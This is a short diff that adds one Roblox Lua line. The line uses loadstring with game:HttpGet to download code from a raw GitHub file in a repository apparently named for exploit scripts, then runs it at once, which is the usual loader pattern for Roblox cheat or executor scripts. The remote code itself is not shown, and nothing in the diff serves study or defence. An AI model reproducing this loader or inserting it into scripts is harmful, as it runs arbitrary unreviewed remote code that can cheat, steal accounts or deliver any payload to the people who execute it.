@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TrashLUAEQHUB/_Access/refs/heads/main/Kes_test",true))()
